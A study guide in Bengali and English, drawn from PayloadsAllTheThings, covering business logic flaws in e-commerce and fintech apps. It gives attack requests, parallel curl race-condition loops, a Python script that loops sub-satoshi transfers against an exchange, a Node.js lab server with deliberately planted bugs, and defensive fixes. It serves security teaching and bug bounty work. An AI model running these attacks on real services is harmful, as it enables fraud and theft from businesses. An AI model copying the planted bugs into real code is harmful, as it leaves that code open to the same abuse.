# 🧠 Business Logic Errors — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/Business Logic Errors](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors)
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — Business Logic Error কী?](#1-concept--business-logic-error-কী)
2. [কেন এটা অন্য vulnerabilities থেকে আলাদা?](#2-কেন-এটা-অন্য-vulnerabilities-থেকে-আলাদা)
3. [Review Feature Testing](#3-review-feature-testing)
4. [Discount Code Feature Testing](#4-discount-code-feature-testing)
5. [Delivery Fee Manipulation](#5-delivery-fee-manipulation)
6. [Currency Arbitrage](#6-currency-arbitrage)
7. [Premium Feature Exploitation](#7-premium-feature-exploitation)
8. [Refund Feature Exploitation](#8-refund-feature-exploitation)
9. [Cart/Wishlist Exploitation](#9-cartwishlist-exploitation)
10. [Thread Comment Testing](#10-thread-comment-testing)
11. [Rounding Error — Real HackerOne Report Analysis](#11-rounding-error--real-hackerone-report-analysis)
12. [Practical Lab Setup](#12-practical-lab-setup)
13. [Bug Bounty Hunting Checklist](#13-bug-bounty-hunting-checklist)
14. [Defense Cheat Sheet](#14-defense-cheat-sheet)
15. [References](#15-references)

---

## 1. Concept — Business Logic Error কী?

**Business Logic** হলো application এর সেই অংশ যেটা real-world business rules handle করে।

```
E-commerce app এর Business Logic উদাহরণ:
  ✅ "একটা discount code একবারই ব্যবহার করা যাবে"
  ✅ "Product rating হবে 1 থেকে 5 এর মধ্যে"
  ✅ "Refund পাওয়ার পরে product access থাকবে না"
  ✅ "Negative quantity add করা যাবে না"
  ✅ "Premium feature শুধু paid user দেখতে পাবে"
```

**Business Logic Error** হলো যখন এই rules গুলো ঠিকমতো enforce করা হয় না, ফলে attacker expected flow এর বাইরে গিয়ে অপ্রত্যাশিত কিছু করতে পারে।

```
Attack এর Real-World Analogy:
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  একটা দোকানে নিয়ম আছে:                                 │
│  "একজন customer সর্বোচ্চ ১টা offer item কিনতে পারবে"   │
│                                                          │
│  Attacker করলো:                                          │
│  - ৫টা আলাদা browser tab খুললো (race condition)        │
│  - সবগুলো থেকে একসাথে order দিলো                        │
│  - server এর check এর আগেই সব confirm হয়ে গেলো          │
│                                                          │
│  Result: ৫টা offer item পেয়ে গেলো!                      │
└──────────────────────────────────────────────────────────┘
```

---

## 2. কেন এটা অন্য Vulnerabilities থেকে আলাদা?

```
┌────────────────────┬────────────────────────────────────────────┐
│ Vulnerability Type │ কীভাবে কাজ করে                            │
├────────────────────┼────────────────────────────────────────────┤
│ SQL Injection      │ Code এর flaw — unfiltered input            │
│ XSS                │ Code এর flaw — output encoding missing     │
│ Buffer Overflow    │ Code এর flaw — memory management           │
│                    │                                            │
│ Business Logic     │ Code ঠিকঠাক কিন্তু LOGIC ভুল।            │
│ Error              │ Feature টা নিজেই ঠিকমতো design হয়নি।    │
└────────────────────┴────────────────────────────────────────────┘
```

**গুরুত্বপূর্ণ পার্থক্য:**

```
❌ SQL Injection:
   Normal input:  username = "admin"
   Malicious:     username = "admin' OR '1'='1"
   → Code এ bug আছে (sanitization নেই)

✅ Business Logic Error:
   Discount code: "SAVE10" → 10% off
   Attacker applies it 50 times → 500% off পেয়ে গেলো!
   → Code correctly processes each request, কিন্তু RULE enforce হয়নি
```

**কেন এটা scanner দিয়ে ধরা যায় না?**

- Automated scanners (Nikto, Nessus) এগুলো ধরতে পারে না
- Manual testing এবং application logic বোঝা লাগে
- Bug bounty তে এগুলো high/critical severity পায়

---

## 3. Review Feature Testing

### কোথায় পাবে?

E-commerce site এর product review section, app store ratings, Airbnb-style review systems।

### Test Cases

```
Test 1: Unverified Purchase Review
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Goal: Product না কিনেই verified reviewer হিসেবে review দেওয়া

Steps:
  1. POST /api/reviews এ request intercept করো (Burp দিয়ে)
  2. Body তে "verified_purchase": false → true করে দাও
  3. অথবা "order_id" field টা অন্য কারো order_id দিয়ে দেখো

Expected vulnerable response:
  {"status": "success", "review_id": 1234, "verified": true}
```

```
Test 2: Out-of-Range Rating
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Goal: 1-5 scale এর বাইরে rating দেওয়া

Normal request:
  POST /api/reviews
  {"product_id": 101, "rating": 5, "comment": "Great!"}

Modified request:
  {"product_id": 101, "rating": -1, "comment": "test"}
  {"product_id": 101, "rating": 0, "comment": "test"}
  {"product_id": 101, "rating": 999, "comment": "test"}
  {"product_id": 101, "rating": 4.9999, "comment": "test"}

Impact: Product এর average rating manipulate হয়ে যাবে
```

```
Test 3: Duplicate Review (Race Condition)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Goal: একই product এ একই user থেকে multiple reviews

Steps (Burp Repeater দিয়ে):
  1. Review submit request টা capture করো
  2. Burp → Send to Repeater → Tab 10 বার duplicate করো
  3. সব tab একসাথে Send করো (Ctrl+Click)
  4. Server সব request simultaneously process করলে multiple reviews post হয়

Alternatively (bash):
  for i in {1..10}; do
    curl -s -X POST https://target.com/api/reviews \
      -H "Cookie: session=YOUR_COOKIE" \
      -d '{"product_id":101,"rating":1,"comment":"spam"}' &
  done
  wait
```

```
Test 4: Impersonation
━━━━━━━━━━━━━━━━━━━━━
Goal: অন্য user এর নামে review post করা

Request এ "user_id" parameter আছে কিনা দেখো:
  POST /api/reviews
  {"product_id": 101, "user_id": 999, "rating": 5}
              ↑
  এটা বদলে অন্য user এর ID দাও

Vulnerable: server টা logged-in user validate না করে body এর user_id নেয়
```

---

## 4. Discount Code Feature Testing

### Real-World Impact

Bug bounty তে এটা একটা popular category। অনেক e-commerce site এ এই vulnerability আছে।

### Test Cases

```
Test 1: Reusable Discount Code
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  POST /api/apply-discount
  {"code": "SAVE50", "cart_id": "abc123"}

  → Apply করো → order complete করো
  → আবার নতুন cart এ apply করো
  → যদি কাজ করে → Reusable discount bug!
```

```
Test 2: Race Condition — Same Code, Two Accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Problem: Server code টা হয়তো এভাবে কাজ করে:

  Step 1: Check if code is used → (NOT USED)
  Step 2: Apply discount
  Step 3: Mark code as used

  Race window: Step 1 এবং Step 3 এর মাঝখানে!

  Account A     Account B
     │               │
     │─ Check ──────>│ (both see "not used")
     │               │
     │─ Apply ───────┤
     │               │─ Apply (also succeeds!)
     │               │
     │─ Mark used ───┤
                     │─ Mark used (already marked, but discount applied!)

Tools: Burp Suite Repeater (parallel requests) বা Turbo Intruder
```

```
Test 3: HTTP Parameter Pollution
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Goal: একাধিক discount code apply করা যখন শুধু একটাই নেওয়ার কথা

Normal:
  POST /checkout
  discount_code=SAVE10

Polluted:
  POST /checkout
  discount_code=SAVE10&discount_code=SAVE20&discount_code=FREESHIP

  → Server কোনটা নেবে? Depends on language/framework:
    PHP:    শেষেরটা (FREESHIP)
    ASP.NET: প্রথমটা (SAVE10)
    Python: একটা list হিসেবে নেয়

  Some servers apply ALL of them → multiple discounts!
```

```
Test 4: Apply Discount to Non-Discountable Items
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Normal flow:
  SAVE10 → শুধু "Clothing" category তে apply হয়

Attack:
  1. Clothing এ discount apply করো
  2. Request intercept করো
  3. product_id বা category বদলে দাও Electronics এর
  4. Server শুধু code validate করে, category আর check করে না?
  → Electronics এ discount পেয়ে গেলে vulnerability!
```

---

## 5. Delivery Fee Manipulation

```
Vulnerability: Negative Delivery Charge
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Normal checkout flow:
  Items total:    $100.00
  Delivery fee:   $10.00
  ─────────────────────
  Total:          $110.00

Attack — Intercept request and modify:
  POST /api/checkout
  {"items": [...], "delivery_fee": -50}

Vulnerable response:
  Items total:    $100.00
  Delivery fee:   -$50.00
  ─────────────────────
  Total:          $50.00  ← attacker pays less!
```

```
Attack Flow:
┌─────────────────────────────────────────────────┐
│ Step 1: Cart এ item add করো                     │
│ Step 2: Checkout এ যাও                          │
│ Step 3: Burp দিয়ে checkout request intercept    │
│ Step 4: delivery_fee বা shipping_cost field খোঁজো│
│ Step 5: Value টা negative করো (-999)            │
│ Step 6: Forward করো                             │
│ Step 7: Total amount দেখো                       │
└─────────────────────────────────────────────────┘
```

**Common parameter names to test:**

```
delivery_fee, shipping_cost, shipping_fee,
delivery_charge, freight_cost, handling_fee
```

---

## 6. Currency Arbitrage

### কী হয় এখানে?

```
Scenario:
  USD এ কিনলাম → EUR এ refund নিলাম
  Exchange rate difference থেকে profit!

Example:
  USD এ product কিনলাম: $100
  Payment processed: 100 USD

  Refund request করলাম EUR এ:
  EUR/USD rate: 1.10
  Refund পেলাম: €110 → এটা = $121 USD!

  Net profit: $21 (বিনা কারণে!)
```

```
Test Steps:
  1. USD Account দিয়ে $100 এর product কিনো
  2. Refund request করো
  3. Burp দিয়ে refund request intercept করো
  4. currency parameter বদলে দাও: "USD" → "EUR"
  5. যদি EUR এ refund আসে → Currency Arbitrage bug!

Common parameters:
  {"refund_currency": "USD"} → {"refund_currency": "EUR"}
  {"currency": "USD"} → {"currency": "EUR"}
```

---

## 7. Premium Feature Exploitation

### Approach 1: Direct Endpoint Access

```
Premium user URL: /dashboard/premium/analytics
Non-premium user: /dashboard/basic

Test:
  - Basic account এ login করো
  - Premium URL গুলো directly access করার চেষ্টা করো
  - Burp দিয়ে premium user এর response capture করে
    basic account দিয়ে same request পাঠাও
```

### Approach 2: Boolean Value Manipulation

```
Response intercept করলে দেখতে পাবে:
  {
    "user_id": 123,
    "email": "test@test.com",
    "is_premium": false,    ← এটা!
    "features": ["basic"]
  }

Burp Match & Replace দিয়ে:
  Match:   "is_premium": false
  Replace: "is_premium": true

→ Client-side check bypass! (server-side check না থাকলে কাজ করবে)
```

### Approach 3: Cookie/LocalStorage Manipulation

```javascript
// Browser console এ check করো:
localStorage.getItem('user_plan') // "basic" → "premium" করো
document.cookie // plan=basic → plan=premium
sessionStorage.getItem('subscription') // check করো

// অথবা browser DevTools → Application → Storage তে manually edit করো
```

### Approach 4: Cancel & Keep

```
Flow:
  1. Premium subscription কিনো (trial বা cheapest plan)
  2. Immediately cancel করো / refund নাও
  3. দেখো premium features এখনো accessible কিনা

  Vulnerable code:
    if (payment_status == "completed"):  ← এটা check করে
       grant_access()
    # কিন্তু refund এর পরে access revoke করে না!
```

---

## 8. Refund Feature Exploitation

```
Test 1: Product Access After Refund
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. Digital product কিনো (eBook, software license, course)
  2. Download করো / access নাও
  3. Refund request করো
  4. Refund পাওয়ার পরেও product access আছে কিনা দেখো

  Vulnerable: Refund system এবং access control system independent
              কোনো synchronization নেই
```

```
Test 2: Multiple Refund Requests (Race Condition)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. একটা subscription কিনো
  2. Cancel/refund request পাঠাও
  3. Burp Repeater দিয়ে একই request 10 বার simultaneously পাঠাও
  4. Multiple refund পাওয়া গেলে → Race condition bug!

  Attacker's gain:
    $10 product কিনো
    $10 × 10 requests = $100 refund পেয়ে গেলো!
```

---

## 9. Cart/Wishlist Exploitation

### Negative Quantity Attack

```
Normal cart:
  Item A: quantity=2, price=$10, subtotal=$20
  Item B: quantity=1, price=$50, subtotal=$50
  Total: $70

Attack — negative quantity:
  Item A: quantity=-5, price=$10, subtotal=-$50
  Item B: quantity=1,  price=$50, subtotal=$50
  Total: $0 or even negative!

  POST /cart/update
  {"item_id": 101, "quantity": -5}

  যদি server validate না করে → total amount কমে যায়!
```

```
Normal flow:
  ┌──────────────────────────────────────┐
  │ Product A: qty=2  → $20              │
  │ Product B: qty=1  → $50              │
  │ Total:             $70               │
  └──────────────────────────────────────┘

Attack flow:
  ┌──────────────────────────────────────┐
  │ Product A: qty=-5 → -$50 ← modified  │
  │ Product B: qty=1  →  $50             │
  │ Total:              $0  ← FREE!      │
  └──────────────────────────────────────┘
```

### Oversell Attack

```
Test: Stock Limit Bypass
  Available stock: 5 units

  Normal: quantity=5 → OK
  Attack: quantity=100 → Should be rejected

  → যদি accept করে: inventory corruption
  → Race condition দিয়েও করা যায়:
     10 জন user একসাথে last 1 unit কিনতে চাইছে
     Server কতজনকে success দেয়?
```

### Cart Manipulation Between Users

```
Test: IDOR in Cart
  My cart ID: cart_id=ABC123
  Another user's cart: cart_id=XYZ789

  DELETE /cart/items
  {"cart_id": "XYZ789", "item_id": 50}

  → অন্যের cart থেকে item remove করা গেলো? → IDOR vulnerability!
```

---

## 10. Thread Comment Testing

```
Test 1: Comment Limit Bypass
  Normal: একটা post এ max 1 comment per user

  Race condition test:
  for i in {1..20}; do
    curl -s -X POST https://target.com/api/comments \
      -H "Cookie: session=YOUR_SESSION" \
      -d '{"post_id": 101, "text": "spam comment"}' &
  done
  wait

  → Multiple comments post হয়ে গেলে → limit bypass!
```

```
Test 2: Privileged Comment Impersonation
  Normal response:
    {"comment_id": 1, "user_id": 123, "is_moderator": false}

  Modified request:
    {"post_id": 101, "text": "hello", "is_moderator": true}
    {"post_id": 101, "text": "hello", "user_id": 1}  ← admin এর ID
```

---

## 11. Rounding Error — Real HackerOne Report Analysis

### HackerOne Report #176461 — Bitcoin Platform

এটা একটা real-world critical bug যেটা একজন researcher HackerOne এ report করেছিল।

```
Platform: Cryptocurrency exchange (XBT/Bitcoin)
Minimum precision: 1 satoshi = 0.00000001 BTC

Attack:
  Transfer amount: 0.000000005 XBT (= 0.5 satoshi)
  এটা 1 satoshi এর নিচে — minimum precision এর বাইরে

What happened:
  ┌─────────────────────────────────────────────────────┐
  │ Sender's balance:                                   │
  │   Before: 1.000000000 XBT                          │
  │   Deducted: ROUND DOWN to 0 satoshi                 │
  │   After:  1.000000000 XBT  ← unchanged!            │
  │                                                     │
  │ Receiver's balance:                                 │
  │   Before: 0.000000000 XBT                          │
  │   Credited: ROUND UP to 1 satoshi                  │
  │   After:  0.000000001 XBT  ← increased!            │
  └─────────────────────────────────────────────────────┘

Net result: 0.000000001 XBT created from nothing!

Automation:
  No rate limit + No OTP + No fraud detection
  → Loop this infinitely
  → Print unlimited Bitcoin!
```

```python
# Conceptual attack script (educational only)
import requests, time

session = requests.Session()
session.cookies.set('auth', 'YOUR_TOKEN')

attacker_account = "attacker_wallet_id"
count = 0

while True:
    # Transfer 0.5 satoshi (below minimum precision)
    resp = session.post('https://exchange.example.com/transfer', json={
        "to": attacker_account,
        "amount": "0.000000005",  # 0.5 satoshi
        "currency": "XBT"
    })

    if resp.status_code == 200:
        count += 1
        # প্রতি iteration এ 1 satoshi gain
        # 1 satoshi = ~$0.0003 (approximate)
        # 10,000 iterations per minute possible

    time.sleep(0.001)  # No rate limit!
```

### কেন এই Bug Happens?

```
Developer এর mistake:

❌ Wrong approach:
   sender_deduct  = floor(amount)   # 0.5 → 0 (deduct nothing)
   receiver_credit = ceil(amount)   # 0.5 → 1 (credit 1 satoshi)
   # Asymmetric rounding!

✅ Correct approach:
   if amount < MINIMUM_PRECISION:
       raise ValueError("Amount below minimum")
   # অথবা
   amount = round(amount, 8)  # consistent rounding
   sender_deduct = amount
   receiver_credit = amount  # same value!
```

---

## 12. Practical Lab Setup

### Option 1: PortSwigger Web Security Academy (Free!)

```
URL: https://portswigger.net/web-security/logic-flaws

Available Labs:
  ✅ Excessive trust in client-side controls
  ✅ High-level logic vulnerability
  ✅ Low-level logic flaw (integer overflow/underflow)
  ✅ Inconsistent handling of exceptional input
  ✅ Inconsistent security controls
  ✅ Weak isolation on dual-use endpoint
  ✅ Insufficient workflow validation
  ✅ Authentication bypass via flawed state machine
  ✅ Infinite money logic flaw
  ✅ Authentication bypass via encryption oracle

→ এগুলো করলে Business Logic এর real feel পাবে!
```

### Option 2: Vulnerable Node.js App (Custom Lab)

```bash
# Simple vulnerable e-commerce API বানাও
mkdir logic-flaw-lab && cd logic-flaw-lab
npm init -y
npm install express

cat > server.js << 'EOF'
const express = require('express');
const app = express();
app.use(express.json());

let discountUsed = false;  // ← Bug: global, race condition possible
let products = {
  1: { name: "Laptop", price: 1000, stock: 5 }
};

// Vulnerable: No server-side quantity validation
app.post('/cart/update', (req, res) => {
  const { product_id, quantity } = req.body;
  // ❌ No validation: negative quantity allowed!
  const total = products[product_id].price * quantity;
  res.json({ total, message: "Cart updated" });
});

// Vulnerable: Reusable discount (no proper tracking)
app.post('/apply-discount', (req, res) => {
  const { code } = req.body;
  if (code === "SAVE50" && !discountUsed) {
    discountUsed = true;  // ← Race condition: two requests hit this simultaneously
    res.json({ discount: 50, message: "Discount applied!" });
  } else {
    res.json({ discount: 0, message: "Invalid or used code" });
  }
});

app.listen(3000, () => console.log('Lab running on :3000'));
EOF

node server.js
```

```bash
# Test negative quantity:
curl -X POST http://localhost:3000/cart/update \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": -10}'
# Response: {"total": -10000} ← Bug!

# Test race condition on discount:
for i in {1..5}; do
  curl -s -X POST http://localhost:3000/apply-discount \
    -H "Content-Type: application/json" \
    -d '{"code": "SAVE50"}' &
done
wait
# Multiple "Discount applied!" responses → Race condition!
```

---

## 13. Bug Bounty Hunting Checklist

```
Target: E-commerce / SaaS / Fintech app

🔲 CART & PRICING
   □ Negative quantity add করার চেষ্টা করো
   □ Stock limit এর বেশি quantity দাও
   □ Price field directly modify করো (Burp intercept)
   □ Delivery fee কে 0 বা negative করো

🔲 DISCOUNT CODES
   □ Same code multiple times use করো
   □ Race condition test করো (Burp Turbo Intruder)
   □ HTTP Parameter Pollution try করো
   □ Different category তে apply করো

🔲 PAYMENT & REFUND
   □ Refund এর পরে product access check করো
   □ Multiple refund request simultaneously পাঠাও
   □ Currency mismatch test করো
   □ Partial payment দিয়ে full access পাওয়া যায় কিনা

🔲 PREMIUM FEATURES
   □ Direct URL access করো premium endpoints এ
   □ Boolean values (is_premium, plan_type) modify করো
   □ Cookies/localStorage inspect করো
   □ Buy→Cancel→Use flow test করো

🔲 REVIEWS & COMMENTS
   □ Without purchase review দাও
   □ Out-of-range rating (0, -1, 999) দাও
   □ Duplicate review via race condition
   □ Impersonation via user_id modification

🔲 ACCOUNT WORKFLOW
   □ Multi-step form এর steps skip করো
   □ Workflow sequence alter করো (step 3 skip করে step 4 যাও)
   □ Email verification bypass করো
   □ Password reset flow manipulate করো

🔲 ROUNDING & MATH
   □ Extremely small/large values দাও
   □ Float precision edge cases test করো
   □ Integer overflow test করো (999999999)
```

---

## 14. Defense Cheat Sheet

```
Attack                          → Fix
────────────────────────────────────────────────────────────────────
Negative quantity               → Server-side: if qty < 1, reject
Out-of-range rating             → Server-side: validate 1 ≤ rating ≤ 5
Discount code race condition    → Database transaction + row locking
                                  (SELECT FOR UPDATE)
Multiple refund                 → Idempotency key per refund request
Currency arbitrage              → Always refund in original payment currency
Boolean privilege bypass        → Server-side authorization check always
                                  Never trust client-side is_premium
Rounding error                  → Reject amounts below minimum precision
                                  Use consistent rounding (not asymmetric)
Stock oversell                  → Atomic database transactions
                                  Pessimistic locking on inventory
Workflow step skip              → Server-side state machine
                                  Validate previous step completion
```

### Secure Discount Code Implementation (Node.js)

```javascript
// ✅ Correct: Transaction + Atomic Update
app.post('/apply-discount', async (req, res) => {
  const { code, user_id, cart_id } = req.body

  const client = await pool.connect()
  try {
    await client.query('BEGIN')

    // Lock the discount code row (prevents race condition)
    const result = await client.query('SELECT * FROM discount_codes WHERE code = $1 FOR UPDATE', [
      code,
    ])

    const discount = result.rows[0]

    if (!discount || discount.is_used) {
      await client.query('ROLLBACK')
      return res.status(400).json({ error: 'Invalid or already used code' })
    }

    // Server-side category validation
    if (discount.category !== cart.category) {
      await client.query('ROLLBACK')
      return res.status(400).json({ error: 'Code not applicable to this category' })
    }

    // Mark as used atomically
    await client.query(
      'UPDATE discount_codes SET is_used = true, used_by = $1, used_at = NOW() WHERE code = $2',
      [user_id, code],
    )

    await client.query('COMMIT')
    res.json({ discount: discount.value, message: 'Applied!' })
  } catch (err) {
    await client.query('ROLLBACK')
    res.status(500).json({ error: 'Transaction failed' })
  } finally {
    client.release()
  }
})
```

---

## 15. References

| Resource                           | Link                                                                                                |
| ---------------------------------- | --------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings               | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors) |
| PortSwigger — Logic Flaws          | [Web Security Academy](https://portswigger.net/web-security/logic-flaws)                            |
| OWASP Business Logic Vulnerability | [OWASP](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)               |
| CWE-840                            | [CWE](https://cwe.mitre.org/data/definitions/840.html)                                              |
| HackerOne Report #176461           | [Archive](https://web.archive.org/web/20170303191338/https://hackerone.com/reports/176461)          |
| Burp Suite Turbo Intruder          | [PortSwigger](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)                   |

---

> ✅ **Next Topic Suggestions:**
>
> - `Race Condition/README.md` — এই topic এর সাথে directly related
> - `Insecure Direct Object References/README.md` — IDOR (cart/user manipulation)
> - `Mass Assignment/README.md` — Parameter manipulation attacks
> - `Account Takeover/README.md` — Refund + access bypass escalation

> ⚠️ **Ethical Reminder:** এই techniques শুধুমাত্র Bug Bounty programs, authorized pentest, এবং lab environments এ ব্যবহার করো।
